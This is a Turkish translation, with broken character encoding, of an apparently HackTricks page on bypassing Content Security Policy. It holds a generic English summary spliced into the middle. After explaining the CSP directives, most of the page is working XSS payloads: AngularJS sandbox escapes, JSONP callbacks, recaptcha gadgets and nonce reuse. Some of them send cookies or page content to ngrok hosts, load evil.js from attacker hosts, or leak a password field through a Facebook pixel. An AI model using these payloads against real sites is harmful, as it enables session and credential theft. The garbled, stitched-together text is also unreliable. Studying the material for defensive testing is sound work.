# Content Security Policy (CSP) Bypass

## Ä°Ã§erik GÃ¼venlik PolitikasÄ± (CSP) Atlatma

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olacak ÅŸekilde AWS hacklemeyi Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)\*\* takip edin.\*\*
* **Hacking hilelerinizi paylaÅŸarak HackTricks ve HackTricks Cloud** github depolarÄ±na PR gÃ¶ndererek katkÄ±da bulunun.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve Ã¶dÃ¼l avcÄ±larÄ± ile iletiÅŸim kurmak iÃ§in [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katÄ±lÄ±n!

**Hacking Ä°Ã§gÃ¶rÃ¼leri**\
Hacking'in heyecanÄ±na ve zorluklarÄ±na inen iÃ§eriklerle etkileÅŸime girin

**GerÃ§ek ZamanlÄ± Hack Haberleri**\
HÄ±zlÄ± tempolu hacking dÃ¼nyasÄ±nda gerÃ§ek zamanlÄ± haberler ve iÃ§gÃ¶rÃ¼lerle gÃ¼ncel kalÄ±n

**En Son Duyurular**\
YayÄ±nlanan en yeni Ã¶dÃ¼l avÄ± programlarÄ± ve Ã¶nemli platform gÃ¼ncellemeleri hakkÄ±nda bilgi edinin

**Bize katÄ±lÄ±n** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ve bugÃ¼n en iyi hackerlarla iÅŸbirliÄŸine baÅŸlayÄ±n!

### CSP Nedir

Ä°Ã§erik GÃ¼venlik PolitikasÄ± (CSP), baÅŸlÄ±ca olarak **Ã§apraz site komut dosyasÄ± (XSS) gibi saldÄ±rÄ±lara karÅŸÄ± koruma saÄŸlamayÄ± amaÃ§layan bir tarayÄ±cÄ± teknolojisi** olarak kabul edilir. TarayÄ±cÄ± tarafÄ±ndan gÃ¼venli bir ÅŸekilde yÃ¼klenebilecek kaynaklarÄ±n yollarÄ±nÄ± ve kaynaklarÄ± tanÄ±mlayarak Ã§alÄ±ÅŸÄ±r. Bu kaynaklar, resimler, Ã§erÃ§eveler ve JavaScript gibi bir dizi unsuru kapsar. Ã–rneÄŸin, bir politika, aynÄ± etki alanÄ±ndan (self), iÃ§ kaynaklarÄ± ve `eval`, `setTimeout` veya `setInterval` gibi fonksiyonlar aracÄ±lÄ±ÄŸÄ±yla dize kodunun yÃ¼klenmesine ve yÃ¼rÃ¼tÃ¼lmesine izin verebilir.

CSP'nin uygulanmasÄ± **yanÄ±t baÅŸlÄ±klarÄ±** aracÄ±lÄ±ÄŸÄ±yla veya **HTML sayfasÄ±na meta Ã¶ÄŸeleri ekleyerek** gerÃ§ekleÅŸtirilir. Bu politikaya gÃ¶re, tarayÄ±cÄ±lar bu ÅŸartlarÄ± proaktif olarak uygular ve tespit edilen ihlalleri derhal engeller.

* YanÄ±t baÅŸlÄ±ÄŸÄ± aracÄ±lÄ±ÄŸÄ±yla uygulanÄ±r:

```
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```

* Meta etiketi aracÄ±lÄ±ÄŸÄ±yla uygulanmÄ±ÅŸtÄ±r:

```xml
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```

#### BaÅŸlÄ±klar

CSP, bu baÅŸlÄ±klar kullanÄ±larak zorunlu kÄ±lÄ±nabilir veya izlenebilir:

* `Content-Security-Policy`: CSP'yi zorlar; tarayÄ±cÄ± herhangi bir ihlali engeller.
* `Content-Security-Policy-Report-Only`: Ä°zleme iÃ§in kullanÄ±lÄ±r; ihlalleri engellemeden raporlar. Ãœretim Ã¶ncesi ortamlarda test etmek iÃ§in idealdir.

#### KaynaklarÄ± TanÄ±mlama

CSP, etkin ve pasif iÃ§erik yÃ¼kleme iÃ§in kÃ¶kenleri kÄ±sÄ±tlar, iÃ§ iÃ§e JavaScript yÃ¼rÃ¼tme ve `eval()` kullanÄ±mÄ± gibi yÃ¶nleri kontrol eder. Bir Ã¶rnek politika ÅŸÃ¶yle belirlenir:

```bash
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```

#### YÃ¶nergeler

* **script-src**: JavaScript iÃ§in belirli kaynaklara izin verir, URL'ler, iÃ§ iÃ§e betikler ve olay iÅŸleyicileri veya XSLT stilleri tarafÄ±ndan tetiklenen betikler dahil.
* **default-src**: Belirli getirme yÃ¶nergeleri yokken kaynaklarÄ± getirmek iÃ§in varsayÄ±lan bir politika belirler.
* **child-src**: Web iÅŸÃ§ileri ve gÃ¶mÃ¼lÃ¼ Ã§erikler iÃ§in izin verilen kaynaklarÄ± belirtir.
* **connect-src**: fetch, WebSocket, XMLHttpRequest gibi arabirimler kullanÄ±larak yÃ¼klenebilecek URL'leri kÄ±sÄ±tlar.
* **frame-src**: Ã‡erÃ§eveler iÃ§in URL'leri kÄ±sÄ±tlar.
* **frame-ancestors**: GeÃ§erli sayfayÄ± gÃ¶mebilecek kaynaklarÄ± belirtir, `<frame>`, `<iframe>`, `<object>`, `<embed>` ve `<applet>` gibi Ã¶ÄŸelere uygulanÄ±r.
* **img-src**: GÃ¶rÃ¼ntÃ¼ler iÃ§in izin verilen kaynaklarÄ± tanÄ±mlar.
* **font-src**: `@font-face` kullanÄ±larak yÃ¼klenen yazÄ± tipleri iÃ§in geÃ§erli kaynaklarÄ± belirtir.
* **manifest-src**: Uygulama manifest dosyalarÄ±nÄ±n izin verilen kaynaklarÄ±nÄ± tanÄ±mlar.
* **media-src**: Medya nesnelerini yÃ¼klemek iÃ§in izin verilen kaynaklarÄ± tanÄ±mlar.
* **object-src**: `<object>`, `<embed>` ve `<applet>` Ã¶ÄŸeleri iÃ§in izin verilen kaynaklarÄ± tanÄ±mlar.
* **base-uri**: `<base>` Ã¶ÄŸeleri kullanÄ±larak yÃ¼klenmesine izin verilen URL'leri belirtir.
* **form-action**: Form gÃ¶nderimleri iÃ§in geÃ§erli uÃ§ noktalarÄ± listeler.
* **plugin-types**: Bir sayfanÄ±n Ã§aÄŸÄ±rabileceÄŸi mime tÃ¼rlerini kÄ±sÄ±tlar.
* **upgrade-insecure-requests**: TarayÄ±cÄ±lara HTTP URL'leri HTTPS'ye yeniden yazmalarÄ±nÄ± sÃ¶yler.
* **sandbox**: Bir `<iframe>`'in sandbox Ã¶zniteliÄŸi gibi kÄ±sÄ±tlamalar uygular.
* **report-to**: Politika ihlal edildiÄŸinde raporun gÃ¶nderileceÄŸi bir grup belirtir.
* **worker-src**: Worker, SharedWorker veya ServiceWorker betikleri iÃ§in geÃ§erli kaynaklarÄ± belirtir.
* **prefetch-src**: Getirilecek veya Ã¶nceden getirilecek kaynaklar iÃ§in geÃ§erli kaynaklarÄ± belirtir.
* **navigate-to**: Bir belgenin herhangi bir ÅŸekilde (a, form, window.location, window.open, vb.) yÃ¶nlendirebileceÄŸi URL'leri kÄ±sÄ±tlar.

#### Kaynaklar

* `*`: `data:`, `blob:`, `filesystem:` ÅŸemalarÄ±na sahip olmayan tÃ¼m URL'lere izin verir.
* `'self'`: AynÄ± etki alanÄ±ndan yÃ¼kleme yapÄ±lmasÄ±na izin verir.
* `'data'`: Verilerin veri ÅŸemasÄ± aracÄ±lÄ±ÄŸÄ±yla yÃ¼klenmesine izin verir (Ã¶rneÄŸin, Base64 kodlu gÃ¶rÃ¼ntÃ¼ler).
* `'none'`: Herhangi bir kaynaktan yÃ¼kleme yapmayÄ± engeller.
* `'unsafe-eval'`: `eval()` ve benzeri yÃ¶ntemlerin kullanÄ±mÄ±na izin verir, gÃ¼venlik nedeniyle Ã¶nerilmez.
* `'unsafe-hashes'`: Belirli iÃ§ iÃ§e olay iÅŸleyicilerini etkinleÅŸtirir.
* `'unsafe-inline'`: Ä°Ã§ iÃ§e `<script>` veya `<style>` gibi kaynaklarÄ±n kullanÄ±mÄ±na izin verir, gÃ¼venlik nedeniyle Ã¶nerilmez.
* `'nonce'`: Kriptografik bir nonce (bir kez kullanÄ±lan sayÄ±) kullanarak belirli iÃ§ iÃ§e betikler iÃ§in bir beyaz liste oluÅŸturur.
* EÄŸer JS sÄ±nÄ±rlÄ± yÃ¼rÃ¼tme varsa, sayfa iÃ§inde kullanÄ±lan bir nonce'yi `doc.defaultView.top.document.querySelector("[nonce]")` kullanarak almak ve ardÄ±ndan kÃ¶tÃ¼ amaÃ§lÄ± bir betik yÃ¼klemek iÃ§in yeniden kullanmak mÃ¼mkÃ¼ndÃ¼r (strict-dynamic kullanÄ±lÄ±yorsa, herhangi bir izin verilen kaynak yeni kaynaklar yÃ¼kleyebilir, bu nedenle bu gerekli deÄŸildir), Ã¶rneÄŸin:

<details>

<summary>Nonce'yi yeniden kullanarak betik yÃ¼kle</summary>

\`\`\`html ![](https://github.com/carlospolop/hacktricks/blob/tr/pentesting-web/content-security-policy-csp-bypass/x) \`\`\`

</details>

* `'sha256-<hash>'`: Belirli bir sha256 karma deÄŸerine sahip betikleri beyaz listeye alÄ±r.
* `'strict-dynamic'`: Bir nonce veya karma ile beyaz listeye alÄ±nmÄ±ÅŸsa, herhangi bir kaynaktan betik yÃ¼klenmesine izin verir.
* `'host'`: `example.com` gibi belirli bir ana bilgisayar belirtir.
* `https:`: URL'leri yalnÄ±zca HTTPS kullananlara kÄ±sÄ±tlar.
* `blob:`: KaynaklarÄ±n Blob URL'lerinden (Ã¶rneÄŸin, JavaScript aracÄ±lÄ±ÄŸÄ±yla oluÅŸturulan Blob URL'lerinden) yÃ¼klenmesine izin verir.
* `filesystem:`: KaynaklarÄ±n dosya sisteminden yÃ¼klenmesine izin verir.
* `'report-sample'`: Ä°hlal raporunda ihlal eden kodun bir Ã¶rneÄŸini iÃ§erir (hata ayÄ±klama iÃ§in faydalÄ±dÄ±r).
* `'strict-origin'`: 'self' ile benzerdir ancak kaynaklarÄ±n protokol gÃ¼venlik dÃ¼zeyinin belgenin eÅŸleÅŸtiÄŸinden emin olur (yalnÄ±zca gÃ¼venli kÃ¶kenler, gÃ¼venli kÃ¶kenlerden kaynaklarÄ± yÃ¼kleyebilir).
* `'strict-origin-when-cross-origin'`: AynÄ± kÃ¶ken istekleri yaparken tam URL'leri gÃ¶nderir, ancak istek Ã§apraz kÃ¶ken olduÄŸunda yalnÄ±zca kÃ¶keni gÃ¶nderir.
* `'unsafe-allow-redirects'`: Hemen baÅŸka bir kaynaÄŸa yÃ¶nlendirecek kaynaklarÄ±n yÃ¼klenmesine izin verir. GÃ¼venliÄŸi zayÄ±flatmasÄ± nedeniyle Ã¶nerilmez.

### GÃ¼vensiz CSP KurallarÄ±

#### 'unsafe-inline'

```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```

Ã‡alÄ±ÅŸan yÃ¼k: `"/><script>alert(1);</script>`

**Iframe'lar aracÄ±lÄ±ÄŸÄ±yla self + 'unsafe-inline'**

{% content-ref url="csp-bypass-self-+-unsafe-inline-with-iframes.md" %}
[csp-bypass-self-+-unsafe-inline-with-iframes.md](csp-bypass-self-+-unsafe-inline-with-iframes.md)
{% endcontent-ref %}

#### 'unsafe-eval'

```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```

Ã‡alÄ±ÅŸan yÃ¼k:

```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```

#### strict-dynamic

EÄŸer bir **izin verilen JS kodu DOM'da yeni bir script etiketi oluÅŸturabilirse**, Ã§Ã¼nkÃ¼ bir izin verilen script bunu oluÅŸturuyorsa, **yeni script etiketi Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±na izin verilecektir**.

#### Wildcard (\*)

```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```

Ã‡alÄ±ÅŸan yÃ¼k:

```markup
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```

#### object-src ve default-src EksikliÄŸi

{% hint style="danger" %}
**GÃ¶rÃ¼nÃ¼ÅŸe gÃ¶re artÄ±k bu Ã§alÄ±ÅŸmÄ±yor**
{% endhint %}

```yaml
Content-Security-Policy: script-src 'self' ;
```

Ã‡alÄ±ÅŸan yÃ¼kler:

```markup
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```

#### Dosya YÃ¼kleme + 'self'

```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```

EÄŸer bir JS dosyasÄ± yÃ¼kleyebilirseniz, bu CSP'yi atlayabilirsiniz:

Ã‡alÄ±ÅŸan yÃ¼k:

```markup
"/>'><script src="/uploads/picture.png.js"></script>
```

Ancak, sunucunun **yÃ¼klenen dosyayÄ± doÄŸruladÄ±ÄŸÄ± ve yalnÄ±zca belirli tÃ¼rde dosyalarÄ±n yÃ¼klenmesine izin verdiÄŸi** oldukÃ§a olasÄ±dÄ±r.

DahasÄ±, sunucu tarafÄ±ndan kabul edilen bir uzantÄ± kullanarak bir dosyanÄ±n iÃ§ine **JS kodu yÃ¼kleseniz bile (Ã¶rneÄŸin: **_**script.png**_**)** bu yeterli olmayabilir Ã§Ã¼nkÃ¼ bazÄ± sunucular gibi apache sunucusu **dosyanÄ±n MIME tÃ¼rÃ¼nÃ¼ uzantÄ±ya gÃ¶re seÃ§er** ve Chrome gibi tarayÄ±cÄ±lar, bir resim olmasÄ± gereken bir ÅŸeyin iÃ§indeki Javascript kodunu **Ã§alÄ±ÅŸtÄ±rmayÄ± reddeder**. "Neyse ki", hatalar var. Ã–rneÄŸin, bir CTF'den Ã¶ÄŸrendiÄŸim gibi **Apache'nin** _**.wave**_ uzantÄ±sÄ±nÄ± tanÄ±madÄ±ÄŸÄ±nÄ±, bu nedenle bir **ses/\*** MIME tÃ¼rÃ¼yle sunmadÄ±ÄŸÄ±nÄ± biliyorum.

Buradan, bir XSS ve dosya yÃ¼kleme bulursanÄ±z ve **yanlÄ±ÅŸ yorumlanan bir uzantÄ±** bulmayÄ± baÅŸarÄ±rsanÄ±z, o uzantÄ±ya sahip bir dosyayÄ± ve betiÄŸin Ä°Ã§eriÄŸini yÃ¼klemeyi deneyebilirsiniz. Veya, sunucu yÃ¼klenen dosyanÄ±n doÄŸru biÃ§imini kontrol ediyorsa, bir **Ã§okdilli** oluÅŸturabilirsiniz ([burada bazÄ± Ã§okdilli Ã¶rnekler](https://github.com/Polydet/polyglot-database)).

#### Form-action

JS enjekte etmek mÃ¼mkÃ¼n deÄŸilse, Ã¶rneÄŸin kimlik bilgilerini **form eylemi enjekte ederek** sÄ±zdÄ±rmayÄ± deneyebilirsiniz (ve belki de ÅŸifre yÃ¶neticilerinin otomatik olarak ÅŸifreleri doldurmasÄ±nÄ± bekleyebilirsiniz). Bir [**Ã¶rneÄŸi bu raporda bulabilirsiniz**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp). AyrÄ±ca, `default-src`'nin form eylemlerini kapsamadÄ±ÄŸÄ±nÄ± unutmayÄ±n.

#### ÃœÃ§Ã¼ncÃ¼ Taraf UÃ§ NoktalarÄ± + ('unsafe-eval')

{% hint style="warning" %}
AÅŸaÄŸÄ±daki bazÄ± payloadlar iÃ§in **`unsafe-eval` bile gerekli deÄŸil**.
{% endhint %}

```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```

Angular'Ä±n zafiyetli bir sÃ¼rÃ¼mÃ¼nÃ¼ yÃ¼kleyin ve keyfi JS kodunu Ã§alÄ±ÅŸtÄ±rÄ±n:

```xml
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```

**Angular + `window` nesnesini dÃ¶ndÃ¼ren fonksiyonlara sahip bir kÃ¼tÃ¼phane kullanarak yÃ¼klemeler (**[**bu yazÄ±ya bakÄ±n**](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)**):**

{% hint style="info" %}
YazÄ±, `cdn.cloudflare.com` (veya izin verilen baÅŸka JS kÃ¼tÃ¼phaneleri deposu) Ã¼zerinden **tÃ¼m kÃ¼tÃ¼phaneleri yÃ¼kleyebileceÄŸinizi**, her kÃ¼tÃ¼phaneden eklenen tÃ¼m fonksiyonlarÄ± Ã§alÄ±ÅŸtÄ±rabileceÄŸinizi ve **hangi fonksiyonlarÄ±n hangi kÃ¼tÃ¼phanelerden `window` nesnesini dÃ¶ndÃ¼rdÃ¼ÄŸÃ¼nÃ¼** kontrol edebileceÄŸinizi gÃ¶stermektedir.
{% endhint %}

```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>
```

### Angular XSS from a class name:

#### SÄ±nÄ±f adÄ±ndan Angular XSS:

```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```

**Google recaptcha JS kodunu suiistimal etmek**

[**Bu CTF Ã§Ã¶zÃ¼mÃ¼ne gÃ¶re**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?\_x\_tr\_sl=es&\_x\_tr\_tl=en&\_x\_tr\_hl=es&\_x\_tr\_pto=wapp#noteninja-3-solves), bir CSP iÃ§inde [https://www.google.com/recaptcha/](https://www.google.com/recaptcha/) adresini suiistimal ederek CSP'yi atlayarak keyfi JS kodunu yÃ¼rÃ¼tebilirsiniz:

```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```

Daha fazla [**bu yazÄ±dan payloadlar**](https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/) bulunabilir:

```html
<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>

<!-- Trigger alert -->
<img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>

<!-- Reuse nonce -->
<img src=x ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)'>
```

**www.google.com'un aÃ§Ä±k yÃ¶nlendirmesi iÃ§in kÃ¶tÃ¼ye kullanÄ±m**

AÅŸaÄŸÄ±daki URL, Ã¶rnek.com'a yÃ¶nlendirme yapar (buradan [buraya](https://www.landh.tech/blog/20240304-google-hack-50000/)):

```
https://www.google.com/amp/s/example.com/
```

#### ÃœÃ§Ã¼ncÃ¼ Taraf UÃ§ NoktalarÄ± + JSONP

\*.google.com/script.google.com kÃ¶tÃ¼ye kullanÄ±mÄ±

Google Apps Script kÃ¶tÃ¼ye kullanÄ±larak script.google.com iÃ§inde bir sayfada bilgi almak mÃ¼mkÃ¼ndÃ¼r. Bu [raporda olduÄŸu gibi](https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/) yapÄ±lmÄ±ÅŸtÄ±r.

```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```

Belirli alan adÄ± beyaz listesine alÄ±nmÄ±ÅŸ olan senaryolarda `script-src`nin `self` ve belirli bir alan adÄ± olarak ayarlandÄ±ÄŸÄ± durumlar JSONP kullanÄ±larak atlatÄ±labilir. JSONP uÃ§ noktalarÄ± gÃ¼vensiz geri Ã§aÄŸÄ±rma yÃ¶ntemlerine izin verir ve saldÄ±rganÄ±n XSS gerÃ§ekleÅŸtirmesine olanak tanÄ±r, Ã§alÄ±ÅŸan yÃ¼k:

```markup
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```

[**JSONBee**](https://github.com/zigoo0/JSONBee) **farklÄ± web sitelerinin CSP atlatmasÄ±na hazÄ±r JSONP uÃ§ noktalarÄ± iÃ§erir.**

AynÄ± zafiyet, **gÃ¼venilir uÃ§ nokta bir AÃ§Ä±k YÃ¶nlendirme iÃ§eriyorsa** meydana gelecektir Ã§Ã¼nkÃ¼ baÅŸlangÄ±Ã§ uÃ§ noktasÄ± gÃ¼venilirse, yÃ¶nlendirmeler gÃ¼venilir olacaktÄ±r.

#### ÃœÃ§Ã¼ncÃ¼ Taraf KÃ¶tÃ¼ye KullanÄ±mlar

[ÅŸu yazÄ±da](https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses) aÃ§Ä±klandÄ±ÄŸÄ± gibi, CSP'de bir yerlerde izin verilmiÅŸ olan birÃ§ok Ã¼Ã§Ã¼ncÃ¼ taraf alanÄ±, ya veri sÄ±zdÄ±rmak ya da JavaScript kodu yÃ¼rÃ¼tmek iÃ§in kÃ¶tÃ¼ye kullanÄ±labilir. Bu Ã¼Ã§Ã¼ncÃ¼ taraflardan bazÄ±larÄ± ÅŸunlardÄ±r:

| KuruluÅŸ           | Ä°zin Verilen Alanlar                         | Yetenekler        |
| ----------------- | -------------------------------------------- | ----------------- |
| Facebook          | www.facebook.com, \*.facebook.com            | SÄ±zdÄ±rma          |
| Hotjar            | \*.hotjar.com, ask.hotjar.io                 | SÄ±zdÄ±rma          |
| Jsdelivr          | \*.jsdelivr.com, cdn.jsdelivr.net            | YÃ¼rÃ¼tme           |
| Amazon CloudFront | \*.cloudfront.net                            | SÄ±zdÄ±rma, YÃ¼rÃ¼tme |
| Amazon AWS        | \*.amazonaws.com                             | SÄ±zdÄ±rma, YÃ¼rÃ¼tme |
| Azure Websites    | \*.azurewebsites.net, \*.azurestaticapps.net | SÄ±zdÄ±rma, YÃ¼rÃ¼tme |
| Salesforce Heroku | \*.herokuapp.com                             | SÄ±zdÄ±rma, YÃ¼rÃ¼tme |
| Google Firebase   | \*.firebaseapp.com                           | SÄ±zdÄ±rma, YÃ¼rÃ¼tme |

Hedefinizin CSP'sinde izin verilen alanlardan herhangi birini bulursanÄ±z, bÃ¼yÃ¼k ihtimalle Ã¼Ã§Ã¼ncÃ¼ taraf hizmetine kaydolarak CSP'yi atlayabilir ve ya veriyi o hizmete sÄ±zdÄ±rabilir ya da kodu yÃ¼rÃ¼tebilirsiniz.

Ã–rneÄŸin, aÅŸaÄŸÄ±daki CSP'yi bulursanÄ±z:

```
Content-Security-Policyâ€‹: default-src 'selfâ€™ www.facebook.com;â€‹
```

## Content Security Policy (CSP) Bypass

### Introduction

Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, such as Cross Site Scripting (XSS) and data injection attacks. However, misconfigurations or bypasses in CSP can lead to security vulnerabilities.

### Bypass Techniques

#### 1. Inline Script Bypass

When CSP is configured to block inline scripts (`'unsafe-inline'`), attackers can bypass this restriction by using techniques like **nonce-based bypass**, **hash-based bypass**, or **tricking the CSP**.

#### 2. External Script Bypass

If CSP is configured to only allow scripts from specific domains, attackers can bypass this restriction by **hosting malicious scripts on allowed domains**, **using subdomains**, or **exploiting misconfigured whitelists**.

#### 3. Script-src Bypass

Attackers can bypass CSP by **injecting scripts using other directives** like `connect-src`, `img-src`, or `style-src`.

### Conclusion

Understanding how CSP works and the potential bypass techniques is crucial for security professionals to effectively protect web applications from attacks. Regular security assessments and testing can help identify and mitigate CSP bypass vulnerabilities.

```
Content-Security-Policyâ€‹: connect-src www.facebook.com;â€‹
```

1. [Burada](https://developers.facebook.com/) bir Facebook GeliÅŸtirici hesabÄ± oluÅŸturun.
2. Yeni bir "Facebook GiriÅŸ" uygulamasÄ± oluÅŸturun ve "Website" seÃ§eneÄŸini seÃ§in.
3. "Ayarlar -> Temel"e gidin ve "Uygulama KimliÄŸi"nizi alÄ±n.
4. Veri sÄ±zdÄ±rmak istediÄŸiniz hedef sitede, Facebook SDK cihazÄ± "fbq" ve "customEvent" ile veri yÃ¼kÃ¼nÃ¼ doÄŸrudan kullanarak veri sÄ±zdÄ±rabilirsiniz.
5. Uygulama "Etkinlik YÃ¶neticisi"ne gidin ve oluÅŸturduÄŸunuz uygulamayÄ± seÃ§in (etkinlik yÃ¶neticisinin URL'si ÅŸuna benzer bir yerde bulunabilir: https://www.facebook.com/events\_manager2/list/pixel/\[app-id]/test\_events)
6. "Test Etkinlikleri" sekmesini seÃ§erek "sizin" web siteniz tarafÄ±ndan gÃ¶nderilen etkinlikleri gÃ¶rebilirsiniz.

ArdÄ±ndan, kurban tarafÄ±nda, aÅŸaÄŸÄ±daki kodu yÃ¼rÃ¼terek Facebook takip pikselini baÅŸlatÄ±n ve saldÄ±rganÄ±n Facebook geliÅŸtirici hesabÄ± uygulama kimliÄŸine iÅŸaret eden Ã¶zel bir etkinlik oluÅŸturun:

```JavaScript
fbq('init', '1279785999289471');â€‹ // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{â€‹
data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"â€‹
});
```

#### Ã–nceki tabloda belirtilen diÄŸer yedi Ã¼Ã§Ã¼ncÃ¼ taraf etki alanÄ± iÃ§in, bunlarÄ± kÃ¶tÃ¼ye kullanabileceÄŸiniz birÃ§ok baÅŸka yol vardÄ±r. DiÄŸer Ã¼Ã§Ã¼ncÃ¼ taraf kÃ¶tÃ¼ye kullanÄ±mlar hakkÄ±nda ek aÃ§Ä±klamalar iÃ§in Ã¶nceki [blog gÃ¶nderisine](https://sensepost.com/blog/2023/dress-codethe-talk/#bypasses) baÅŸvurun.

#### RPO (Relative Path Overwrite) AracÄ±lÄ±ÄŸÄ±yla Atlatma <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a>

YukarÄ±da bahsedilen yÃ¶nlendirmeye ek olarak, bazÄ± sunucularda kullanÄ±labilen Relative Path Overwrite (RPO) adlÄ± baÅŸka bir teknik bulunmaktadÄ±r.

Ã–rneÄŸin, CSP'nin `https://example.com/scripts/react/` yoluna izin verdiÄŸi durumda, aÅŸaÄŸÄ±daki gibi atlatÄ±labilir:

```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```

TarayÄ±cÄ± sonunda `https://example.com/scripts/angular/angular.js` adresini yÃ¼kleyecektir.

